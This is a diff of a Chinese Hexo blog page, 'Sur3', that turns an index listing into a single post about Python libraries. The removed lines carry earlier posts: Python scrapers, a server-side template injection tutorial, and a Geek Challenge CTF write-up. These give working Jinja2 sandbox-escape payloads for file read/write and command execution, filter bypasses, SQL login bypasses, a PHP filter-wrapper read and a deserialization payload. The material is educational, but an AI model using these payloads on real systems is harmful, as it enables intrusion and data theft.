@@ -8,13 +8,19 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>Sur3</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="python部分库总结标签（空格分隔）： 未分类  杂项隐写turtleTurtle库是Python语言中一个很流行的绘制图像的函数库.常用函数：setup(width,height,startx,starty) 设置窗口大小以及起始点，不设置默认为中心。goto(d,d) 从当前的点指向括号内所给坐标fd(d) 指沿着海龟的前方向运行bk(d) 指沿着海龟的反方向运行seth(angle) 改变">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Sur3">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/02/15/python部分库总结/index.html">
 <meta property="og:site_name" content="Sur3">
+<meta property="og:description" content="python部分库总结标签（空格分隔）： 未分类  杂项隐写turtleTurtle库是Python语言中一个很流行的绘制图像的函数库.常用函数：setup(width,height,startx,starty) 设置窗口大小以及起始点，不设置默认为中心。goto(d,d) 从当前的点指向括号内所给坐标fd(d) 指沿着海龟的前方向运行bk(d) 指沿着海龟的反方向运行seth(angle) 改变">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/15/Fzlmb8.png">
+<meta property="og:updated_time" content="2019-02-15T08:40:20.984Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sur3">
+<meta name="twitter:description" content="python部分库总结标签（空格分隔）： 未分类  杂项隐写turtleTurtle库是Python语言中一个很流行的绘制图像的函数库.常用函数：setup(width,height,startx,starty) 设置窗口大小以及起始点，不设置默认为中心。goto(d,d) 从当前的点指向括号内所给坐标fd(d) 指沿着海龟的前方向运行bk(d) 指沿着海龟的反方向运行seth(angle) 改变">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/01/15/Fzlmb8.png">
   
     <link rel="alternative" href="/atom.xml" title="Sur3" type="application/atom+xml">
   
@@ -138,122 +144,7 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-python爬虫小计" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="python爬虫小计"><a href="#python爬虫小计" class="headerlink" title="python爬虫小计"></a>python爬虫小计</h1><p>##笔趣阁小说目录爬虫</p>
-<pre><code>import requests
-from bs4 import BeautifulSoup
-def main():
-    target=&apos;https://www.biquge5200.com/38_38857/&apos;
-    req=requests.get(url=target)
-    bf=BeautifulSoup(req.text,&apos;html.parser&apos;)
-    content=bf.find_all(&apos;div&apos;,id=&apos;list&apos;)
-    bf_a=BeautifulSoup(str(content[0]),&apos;html.parser&apos;)
-    a=bf_a.find_all(&apos;a&apos;)
-    for each in a:
-        print(each.string,each.get(&apos;href&apos;))
-if __name__==&apos;__main__&apos;:
-    main()
-</code></pre><p>##杭电oj爬虫</p>
-<pre><code>import requests
-import time
-import random
-import re
-from bs4 import BeautifulSoup
-oj_id=[]
-oj_name=[]
-oj_ac=[]
-oj_su=[]
-def get_html(url):
-    try:
-
-        request=requests.get(url,timeout=3)
-        random_time=random.randint(2,5)
-        time.sleep(random_time)
-        return request.text
-    except :  
-        return &quot;&quot;
-def get_oj():
-    t=0
-    for i in range(0,56):
-
-        url=&apos;http://acm.hdu.edu.cn/listproblem.php?vol=&apos;+str(i)
-        html=get_html(url)
-        soup=BeautifulSoup(html,&quot;html.parser&quot;)
-        c=1
-        for a in soup.find_all(&apos;script&apos;):
-            if c==5:
-                strr=a.string
-                listt=re.split(&quot;p\(|\);&quot;, strr)
-                for b in listt:
-                    if b!=&apos;&apos;:
-                        temp = re.split(&apos;,&apos;, b)
-                        lenn=len(temp)
-                        oj_id.append(temp[1])
-                        oj_name.append(temp[3])
-                        oj_ac.append(temp[lenn-2])
-                        oj_su.append(temp[lenn-1])
-            c=c+1
-        t=t+1
-        print(&apos;\r当前进度：{:.2f}%&apos;.format(t * 100 / 55, end=&apos;&apos;))
-def main():
-    get_oj()
-    root=&apos;D://a//1.txt&apos;
-    lenn=len(oj_id)
-    for i in range(0,lenn):
-        with open(root,&apos;a&apos;,encoding=&apos;utf-8&apos;) as k:
-            k.write(&apos;hdu&apos;+oj_id[i]+&apos;,&apos;+oj_name[i]+&quot;,&quot; + oj_ac[i] + &quot;,&quot; + oj_su[i] + &apos;\n&apos;)
-
-if __name__==&apos;__main__&apos;:
-    main()
-</code></pre>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/02/15/python爬虫小计/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-python部分库总结" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+            <article id="post-python部分库总结" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
     <div class="article-entry" itemprop="articleBody">
@@ -340,6 +231,27 @@ print(string)
       
 
       
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
     </div>
     <div class="article-info article-info-index">
       
@@ -347,16 +259,84 @@ print(string)
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/02/15/python部分库总结/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/02/15/python部分库总结/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2019/02/15/python爬虫小计/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/02/15/服务器端模板注入(SSTI)/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -376,563 +356,14 @@ print(string)
 
 
 
-
   
-    <article id="post-服务器端模板注入(SSTI)" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="服务器端模板注入-SSTI"><a href="#服务器端模板注入-SSTI" class="headerlink" title="服务器端模板注入(SSTI)"></a>服务器端模板注入(SSTI)</h1><p>标签（空格分隔）： 未分类</p>
-<hr>
-<p>##什么是服务器端模板<br>服务器端模板提供了一种简单的方法来管理动态生成的HTML代码，优点就是可以在服务器端动态生成HTML页面，使代码更加简单易于管理与修改，避免了如HTML代码和PHP代码复杂的混合在一起，变量难以辨认等状况。</p>
-<p>##模板注入原理<br>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程，由于模板引擎支持使用静态模板文件，并在运行时用HTML页面中的实际值替换变量/占位符从而使html设计变得简略，目前常用模板有Smarty、Twig、Jinja2、FreeMarker和Velocity。</p>
-<p>##常用payload<br>一般来说，ssti可以用于xss，当测试有触发xss时可以进一步考虑模板注入。<br>以下给出一些常用payload。</p>
-<pre><code>//读文件
-().__class__.__bases__[0].__subclasses__()[40](r&apos;C:\1.php&apos;).read()
-
-//写文件
-().__class__.__bases__[0].__subclasses__()[40](&apos;/var/www/html/input&apos;, &apos;w&apos;).write(&apos;123&apos;)
-
-//执行任意命令
-().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&apos; )
-
-
-#命令执行：
-{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
-    #文件操作
-    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}  
-</code></pre><p>##绕过方式<br>在实际使用时我们往往要面对各种各样的限制，这时候就需要使用如拼接绕过，参数绕过等方法。<br>1.拼接绕过<br>由于在模板的url路径中是支持字符串连接的，所以可以如下利用</p>
-<pre><code>request[&apos;__cl&apos;+&apos;ass__&apos;].__base__.__base__.__base__[&apos;__subcla&apos;+&apos;sses__&apos;]()[60]
-</code></pre><p>函数名也可以</p>
-<pre><code>().__class__.__bases__[0].__subclasses__()[40](r&apos;C:\1.php&apos;).re&apos;+&apos;ad()
-</code></pre><p>在躲避关键字检查时可以利用getattribute函数进行拼接</p>
-<pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]
-
-# 进行关键字绕过
-().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;func_global&apos;+&apos;s&apos;)[&apos;linecache&apos;]
-</code></pre><p>2.参数绕过<br>可以利用request.form, request.args,request.values这三个函数，实现在cookie拼接绕过。</p>
-<pre><code>url = &apos;&apos;&apos;http://47.96.118.255:2333/{{''[request.cookies.a][request.cookies.b][2][request.cookies.c]()[40]('a.php')[request.cookies.d]()}}&apos;&apos;&apos;
-
-cookies = {}
-cookies[&apos;a&apos;] = &apos;__class__&apos;
-cookies[&apos;b&apos;] = &apos;__mro__&apos;
-cookies[&apos;c&apos;] = &apos;__subclasses__&apos;
-cookies[&apos;d&apos;] = &apos;read&apos;
-</code></pre><p>##总结<br>1.注意环境是python2还是python3，一般python2有的python3都有。<br>2.若类中有file，考虑读写操作<br>3.若类中有<class 'warnings.warningmessage'="">，考虑从.<strong>init</strong>.func_globals.values()[13]获取eval，map等等；又或者从.<strong>init</strong>.func_globals[linecache] 得到os<br>4.若类中有<type 'file'="">，<class 'ctypes.cdll'="">，<class 'ctypes.libraryloader'="">，考虑构造so文件<br>5.注意导入模块的方式</class></class></type></class></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/02/15/服务器端模板注入(SSTI)/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
-    <article id="post-第九届极客大挑战" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/28/第九届极客大挑战/">第九届极客大挑战</a>
-    </h1>
   
 
-        
-        <a href="/2018/10/28/第九届极客大挑战/" class="archive-article-date">
-  	<time datetime="2018-10-28T13:07:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="第九届极客大挑战"><a href="#第九届极客大挑战" class="headerlink" title="第九届极客大挑战"></a>第九届极客大挑战</h1><p>标签（空格分隔）： 未分类</p>
-<hr>
-<p>##2000字的检讨 </p>
-<blockquote>
-<p>今天你又逃课学习技术，被老师叫到办公室要求写2000字的检讨，当你正发愁时发现三叶草平台的万能检讨书符合老师的标准，但是需要199每年的会员才能复制这份万能检讨书,你该怎么办呢？<br>这种情况我们在网上找资料的时候经常会遇到，文章不允许复制。这时候我们就可以通过F12在查看器中找到内容进行复制。<br><img src="https://s1.ax1x.com/2018/10/28/igArlj.png" alt="此处输入图片的描述"><br>这道题也一样，F12在查看器中复制粘贴即可，得到flag。</p>
-</blockquote>
-<h2 id="幸运大挑战"><a href="#幸运大挑战" class="headerlink" title="幸运大挑战"></a>幸运大挑战</h2><blockquote>
-<p>江师傅今天竟然又收了10个快递，你一边好奇江师傅哪来这么多快递一边准备帮江师傅把快递拿去实验室，走到一半突然发现学校门口的大商场又在搞活动了，只要反应够快就有机会赢得限量版Macbook，你能赢得挑战拿到Macbook吗？</p>
-</blockquote>
-<p>这道题出现是一个秒表，就像前一段时间里抖音快手各大平台十分火爆的，各个商家店前摆的只要能在十秒处停止就能得到各种优惠的计时器。当时我还玩了几次，差距太大果断放弃了。但是在网上让我点停止就好办多了。<br>使用burpsuite抓包，在GET头处改包发回去就能得到flag。<br><img src="https://s1.ax1x.com/2018/10/28/igAs6s.png" alt="此处输入图片的描述"></p>
-<p>##代号为geek的行动第二幕：废弃的地下黑客论坛</p>
-<blockquote>
-<p>经过一周的外围信息收集，“穿山甲”发现该组织的创始人在大学期间曾经创建过一个小型的地下黑客论坛，时过境迁已无人使用，只有一个废弃的后台。。。</p>
-</blockquote>
-<p>这道题直接使用万能密码即可注入，如果不知道为什么可以抓包看一下他显示的查询命令，这里就不多说了。<br><img src="https://s1.ax1x.com/2018/10/28/igAyXn.png" alt="此处输入图片的描述"></p>
-<p>##geek 番外篇之废弃的地下黑客论坛<br>这道题还是和刚才一样的注入方式，只是本题限制不超过四个字符。<br><img src="https://s1.ax1x.com/2018/10/28/igAcmq.png" alt="此处输入图片的描述"><br>这里就需要使用一些小技巧来绕过，username=\&amp;&amp;password=||1#<br>第一个\用来转义单引号，而后面则构成或等于1,恒成立得出答案。<br><img src="https://s1.ax1x.com/2018/10/28/igAg00.png" alt="此处输入图片的描述"></p>
-<h2 id="初来乍到"><a href="#初来乍到" class="headerlink" title="初来乍到"></a>初来乍到</h2><blockquote>
-<p>HTML源码中藏着秘密</p>
-</blockquote>
-<p>这个从提示就能看出来是在源代码中找到flag……<br>过掉。</p>
-<p>##代号为geek的行动第三幕：暗网追击</p>
-<blockquote>
-<p>废弃的后台已经没有当年的论坛人员信息，只有管理员的最后留下的一则公告:Brothers, the forum moved to the<br>dark network xxxxxxxx.onion the new name is HumanSkeleton, where we<br>will meet again.“穿山甲”顺藤摸瓜的找到了入口，可是权限好像有点问题？</p>
-</blockquote>
-<p>首先查看一下右下角的返回头，再结合题意就知道应该改一下这个cookie值。<br><img src="https://s1.ax1x.com/2018/10/28/igAWkT.png" alt="此处输入图片的描述"><br>改完后可以得到一个地址，访问会发现图片中就是flag。<br><img src="https://s1.ax1x.com/2018/10/28/igAhhF.png" alt="此处输入图片的描述"><br><a href="http://admin.game.sycsec.com/caveira-pixel-cores_main-article_f4lg.jpg" target="_blank" rel="noopener">http://admin.game.sycsec.com/caveira-pixel-cores_main-article_f4lg.jpg</a></p>
-<p>##一起来和 php 撸猫啊</p>
-<blockquote>
-<p>三中心的肥猫好可爱呀，php先生每次路过时都忍不住要撸一把猫才走，被撸到脱“发”的肥猫对php先生很是恐惧。你可以通过得到隐藏flag的方式来抑制php先生的这种强烈撸猫欲吗？</p>
-</blockquote>
-<p>说句题外话，这道题我最开始是在手机上做的，做完后回到电脑上死活就是复现不出来，很迷。<br>打开后是一个挺好玩的小游戏。查看源代码可以看到以下代码</p>
-<pre><code>&lt;!--
-if (isset($_GET[&apos;p1&apos;])){
-
-    if ($_GET[&apos;p1&apos;] &gt; 99999999 &amp;&amp; strlen($_GET[&apos;p1&apos;]) &lt; 9){
-
-        if (isset ( $_GET [&apos;p2&apos;] )) {
-                $p2 = $_GET [&apos;p2&apos;];
-                if (is_numeric($p2)){
-                    die(&apos;Input cannot be a number!!!&apos;);
-                }
-                else{
-                    switch ($p2) {
-                        case 0 :
-                            break;    
-                        case 1 :
-                            break;
-                        case 2 :
-                            echo &quot;flag{xxxxx}&quot;;
-                            break;
-                        default :
-                            echo &quot;2333333&quot;;
-                            break;
-                    }
-                }
-
-            }
-    }
-
-}
---&gt;
-</code></pre><p>p1变量必须大于99999999但是长度又不能小于9, 使用科学计数法绕过。p2不能是数字，但是必须等于2，使用%00来隔断。<br>最后payload:p1=1e9&amp;p2=2%00aaa<br><img src="https://s1.ax1x.com/2018/10/28/igA5p4.png" alt="此处输入图片的描述"><br>得到flag</p>
-<h2 id="代号为geek的行动第四幕：绝密情报"><a href="#代号为geek的行动第四幕：绝密情报" class="headerlink" title="代号为geek的行动第四幕：绝密情报"></a>代号为geek的行动第四幕：绝密情报</h2><blockquote>
-<p>绕过了权限之后，“穿山甲”开始了对网站的快速渗透测试，一分钟后他好像找到可以读取情报的漏洞点。 ps:正则失效，出题已祭天</p>
-</blockquote>
-<pre><code> &lt;?php
-error_reporting(0);
-if (!empty($_GET)||!empty($_POST)){
-    if(preg_match(&quot;syclover&quot;,$_GET[&apos;id&apos;])) {
-          echo(&quot;&lt;p&gt;you&apos;re a gay, not allowed !&lt;/p&gt;&quot;);
-          exit();
-    }
-
-    $_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);
-
-    if($_GET[&apos;id&apos;] == &quot;syclover&quot;)
-    {
-          echo &quot;&lt;p&gt;Wow~ ,You&apos;re smart, Access granted!&lt;/p&gt;&quot;;
-
-          $f = $_POST[file];
-          $str = $f.&quot;.php&quot;;
-        @require $str; 
-    }
-    else
-    {
-          @require(&apos;showpass.php&apos;);
-    }
-
-} 
-else {
-    highlight_file(&quot;index.php&quot;);
-}
-
-?&gt; 
-</code></pre><p>   根据代码逻辑我们不难发现，id需要等于syclover，但是一开始传进去就会遇到正则匹配 失败，但是后面有一个urldecode，这我们就可以先url加密绕过。id=%73%79%63%6c%6f%76%65%72<br>    之后使用php伪协议读取，file=php://filter/convert.base64-encode/resource=showpass得到flag。</p>
-<h2 id="江江师傅的秘密"><a href="#江江师傅的秘密" class="headerlink" title="江江师傅的秘密"></a>江江师傅的秘密</h2><blockquote>
-<p>江江师傅天天晚上都偷偷在实验室看视频,上次看到他晚上偷偷打开了C盘根目录下的study.txt文件，听说这几天他用自己电脑写了个三叶草代理平台，你能找到他C盘下的study.txt藏了什么吗?</p>
-</blockquote>
-<p><img src="https://s1.ax1x.com/2018/10/28/igAI1J.png" alt="此处输入图片的描述"><br>利用windows可以使用浏览器直接访问文件，构造链接<br>file:///C:/study.txt<br>出来的太淫荡了，我才不会点。</p>
-<h2 id="柠檬师傅日站的秘籍"><a href="#柠檬师傅日站的秘籍" class="headerlink" title="柠檬师傅日站的秘籍"></a>柠檬师傅日站的秘籍</h2><blockquote>
-<p>一天大柠檬问兔子：你日站看js吗？</p>
-</blockquote>
-<p>打开后查看源代码</p>
-<pre><code>var p = document.getElementById(&quot;result&quot;);
-fetch(&quot;/sycshell?cmd=echo &apos;9th geek&apos;&quot;).then(res=&gt;{
-    return res.json();
-}).then(json=&gt;{
-    var html = &quot;&quot;;
-    json.body.forEach((ele) =&gt; {
-        html += ele.replace(&quot;\r&quot;,&quot;&quot;);
-    });
-    p.innerHTML = html;
-}).catch(err=&gt;{
-    p.innerHTML = &quot;SYCL0veR&quot;;
-});
-</code></pre><p>在代码中我们可以看到有cmd=，命令执行。<br>首先ls看一下都有什么。<br><img src="https://s1.ax1x.com/2018/10/28/igAoc9.png" alt="此处输入图片的描述"><br>剩下就是一个个看，在geek下面有flag,剩下只需要cat一下了<br><img src="https://s1.ax1x.com/2018/10/28/igATXR.png" alt="此处输入图片的描述"></p>
-<h2 id="隐藏在混乱之中的绝密情报"><a href="#隐藏在混乱之中的绝密情报" class="headerlink" title="隐藏在混乱之中的绝密情报"></a>隐藏在混乱之中的绝密情报</h2><blockquote>
-<p>穿山甲对“毒雾”黑客组织进行反渗透的时候，无意间进入到了该组织的医院。穿山甲发现医院里充斥着一种怪病，被这种病感染上的人都会不断的进行复读，细心的穿山甲发现，虽然病人复读的内容看起来杂乱无章，仔细一看其实是一种“序列化”的内容，穿山甲怀疑这就是“毒雾”隐藏绝密情报的一种方法</p>
-</blockquote>
-<p>根据题干显示就是php反序列化，那么只要找php代就好了。关于php反序列化大家可以自行查找一下，我就不多解释了。<br>这题挺有意思的，进去我们很容易就能看出漏洞点在哪，现在开始找php代码.<br><img src="https://s1.ax1x.com/2018/10/28/igAb0x.png" alt="此处输入图片的描述"><br>大家注意看9号的提醒，robots,联想到robots.txt。</p>
-<blockquote>
-<p>If you see a garbled code, please change the encoding mode of the<br>browser.(please using baidu translate or google translate)</p>
-<p>cl0und：你们两个各说一句话证明自己是humans Daedalus：我有我爱的人，我很爱他，我不想离♂开他<br>Mang0：你们两个各说一句话证明自己是humans</p>
-<p>ps.这个东西叫做robots.txt pss.改变下名字试试？ psss.humans的本质是?</p>
-<p>有戏，试试humans.txt吧， If you see a garbled code, please change the<br>encoding mode of the browser.(please using baidu translate or google<br>translate)</p>
-<p>这跟我是个冷酷无情的复读机有什么关系吗</p>
-<p>我最近在复读的同时看到了一份源码，好像是叫<a href="http://www.zip这种东西" target="_blank" rel="noopener">www.zip这种东西</a></p>
-</blockquote>
-<p>在<a href="http://www.zip里下载到源码。" target="_blank" rel="noopener">www.zip里下载到源码。</a><br>根据源码分析可知，在获取到message后会将他进行反序列化传给后台，根据提示，我们只需要将他给序列化就好了。</p>
-<pre><code>&lt;?php
-class Daedalus{
-    function __construct($test)
-    {
-       getflag();
-    }
-}
-class Mang0{
-    var $message=&quot;hello_new_geek&quot;;
-    function __wakeup()
-    {
-        $newgay = new Daedalus($this-&gt;message);
-    }
-}
-
-
-//$message = hello_new_geek;
-$mango = new Mang0();
-$mango-&gt;message=&apos;hello_new_geek&apos;;
-
-echo serialize($mango);
-?&gt;
-</code></pre><p>如上将其序列化内容输入即可得到答案。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/28/第九届极客大挑战/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-建站" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/28/建站/">建站</a>
-    </h1>
   
 
-        
-        <a href="/2018/10/28/建站/" class="archive-article-date">
-  	<time datetime="2018-10-28T13:05:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>先搭建好，剩下的以后再说……</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/28/建站/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Hexo" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/28/Hexo/">Hexo</a>
-    </h1>
   
 
-        
-        <a href="/2018/10/28/Hexo/" class="archive-article-date">
-  	<time datetime="2018-10-28T08:00:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/28/Hexo/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-你好，HEXO“" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/28/你好，HEXO“/">你好，HEXO“</a>
-    </h1>
-  
-
-        
-        <a href="/2018/10/28/你好，HEXO“/" class="archive-article-date">
-  	<time datetime="2018-10-28T07:30:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/28/你好，HEXO“/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/28/hello-world/">Hello World</a>
-    </h1>
-  
-
-        
-        <a href="/2018/10/28/hello-world/" class="archive-article-date">
-  	<time datetime="2018-10-28T06:48:20.084Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
